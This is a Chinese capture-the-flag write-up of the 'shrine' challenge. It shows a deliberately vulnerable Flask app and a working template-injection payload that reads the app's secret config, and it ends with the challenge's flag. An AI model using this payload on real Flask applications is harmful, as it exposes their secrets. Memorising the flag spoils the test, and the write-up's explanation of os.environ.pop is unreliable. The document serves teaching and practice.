# shrine

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=100497b9-0ff5-4427-8159-060062da0c4c_2)

场景打开只看见了一段flask源代码，而flask的考点也很明确了——[模板注入](https://www.freebuf.com/column/187845.html)。先把这串源代码美化一下，使用这个[网站](https://codebeautify.org/python-formatter-beautifier)。

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)
```

- ### os.environ
  > 一个表示字符串环境的 映射 对象。（比如字典） 例如，environ\['HOME'] 是你的主目录（在某些平台上）的路径名

pop()大概就是返回当前路径下FLAG文件的值。app.config\['FLAG']的值就等于FLAG。app.config是当前的项目配置。

所以我们要想办法看到app.config\[FLAG]里面的值。往下看可以发现有个shrine目录。@app.route()是一个装饰器，这里先将其简单理解成设置路径。按照这里的设置，应该还有个/shrine/xxx路径才对。

- http://61.147.171.105:60143/shrine/ds

发现shrine后面跟着的ds被回显了，试一下有没有模版注入。

- http://61.147.171.105:60143/shrine/{{2*2}}

回显显示4，敲定模版注入。现在就是利用了。但是从 return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s 可以发现不能直接传入config。

- ### Flask
  > {{}}表示变量，{{% %}}是jinja引擎特有语法（flask使用的是jinja引擎）。上面的代码意为“遍历blacklist中的词语，如果输入等于黑名单中的词语就将其设定为None。

通过replace还发现圆括号也被过滤了。但是blacklist并没有过滤完全，只是规定了输入不能等于config，没说不能包含config。我从[这里](https://10-0-0-55.github.io/web/flask/ssti/)找到了一个完全可行的payload。

- http://61.147.171.105:60143/shrine/{{url_for.__globals__['current_app'].config["FLAG"]}}
  
直接打印出config中FLAG的内容。

## Flag
> flag{shrine_is_good_ssti}
